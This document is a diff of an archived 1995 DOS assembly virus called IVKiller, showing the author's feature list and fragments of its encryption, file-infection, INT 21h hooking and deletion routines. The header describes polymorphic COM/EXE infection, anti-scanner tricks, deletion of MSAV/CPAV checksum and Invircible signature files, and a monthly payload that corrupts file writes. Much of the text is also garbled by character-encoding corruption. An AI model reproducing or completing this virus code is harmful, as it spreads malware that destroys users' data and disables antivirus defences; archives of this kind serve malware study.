@@ -1,22 +1,33 @@
+; ------------------------------------------------------------
+; name      I
+; type      asm
+; cve       Б─■
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     Б─■
+; ------------------------------------------------------------
 
-; ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд-д
-;  IVKiller - (c)1995 Шirogen - Using ШiCE v0.2А
-; ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд-д
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫
+;  IVKiller - (c)1995 О©╫irogen - Using О©╫iCE v0.2О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫
 ;
 ; This is yet another virus in what I call my Feb '95 series. Anywayz, this
 ; virus's main point is that it candelete Invircible signature files.
 ; Something I haven't seen included with any other viruses.
 ;
-; Ч Polymorphic utilizing ViCE v0.2А. JMPS on, Anti-TBSCAN on.
-; Ч Infects COM and EXE when executed.
-; Ч COM Infection marker: fourth byte is 0
-; Ч EXE infection marker: Checksum in header not equal to 0.
-; Ч Time/Date do not change
-; Ч Read-only and hidden files will be infected, and attributes restored.
-; Ч Virus installs its own critical error handler
-; Ч Deletes MSAV/CPAV CHecksum filez..
-; Ч Deletes Invircible Signature files
-; Ч Activates on the second of any month, at which time it will phuck
+; О©╫ Polymorphic utilizing ViCE v0.2О©╫. JMPS on, Anti-TBSCAN on.
+; О©╫ Infects COM and EXE when executed.
+; О©╫ COM Infection marker: fourth byte is 0
+; О©╫ EXE infection marker: Checksum in header not equal to 0.
+; О©╫ Time/Date do not change
+; О©╫ Read-only and hidden files will be infected, and attributes restored.
+; О©╫ Virus installs its own critical error handler
+; О©╫ Deletes MSAV/CPAV CHecksum filez..
+; О©╫ Deletes Invircible Signature files
+; О©╫ Activates on the second of any month, at which time it will phuck
 ;   up all file writes using INT 21h/func 40h.
 ;
 
@@ -108,7 +119,7 @@ _ret:ret
 exe_jump dd 0
 is_exe db 0
 
-;дддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ; Crypts portion of virus
 ;
 crypt_res:
@@ -128,7 +139,7 @@ xor_val db 0
     sub byte ptr cs:xor_op[bp],10h              ; unmodify code
     ret
 
-;дддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ; Infection routine - called from INT 21h handler.
 ;    DS:DX=fname
 ;
@@ -311,7 +322,7 @@ exe_ok:
 
         jmp     close
 
-;дддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ; set file ptr
 
 offset_zero:                               ; self explanitory
@@ -326,7 +337,7 @@ offset_end:
         int     21h
         ret
 
-;дддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ; close file
 ;
 close_phile:
@@ -334,7 +345,7 @@ close_phile:
         int 21h
         ret
 
-;дддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ; Kill those darned MSAV and CPAV filez..
 ;
 kill_chklst:
@@ -350,7 +361,7 @@ kill_loop:
 first_2die db      'CHKLIST.MS',0          ; MSAV shitty checksum
 last_2die  db      'CHKLIST.CPS',0         ; CPAV shitty checksum
 
-;ддддддддддддддддддддддддддддддддддддддддддддддд
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ; Resets attribs then deletes phile -> DS:DX
 ;
 delete_phile:
@@ -361,7 +372,7 @@ delete_phile:
         mov     ah,41h
         int     21h
         ret
-;ддддддддддддддддддддддддддддддддддддддддддддддддд
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ; Set DTA
 ;
  set_dta:
@@ -369,7 +380,7 @@ delete_phile:
  int 21h
  ret
 
-;ддддддддддддддддддддддддддддддддддддддддддддддддд
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ; Kill Invircible Signature Files
 ;
 kill_iv:
@@ -416,7 +427,7 @@ ff_info db      30 dup (0)
 ff_name db      13 dup (0)
 
 
-;дддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ; new 21h
 
 new21:
@@ -463,7 +474,7 @@ new_24:                                    ; critical error handler
 
 activate db 0
 txt_ptr dw offset credits
-credits db '[IvKiller, by Шirogen]'
+credits db '[IvKiller, by О©╫irogen]'
 credit_end:
 new_jmp db 0E9h,0,0,0                      ; jmp XXXX,0
 rel_off dw 0
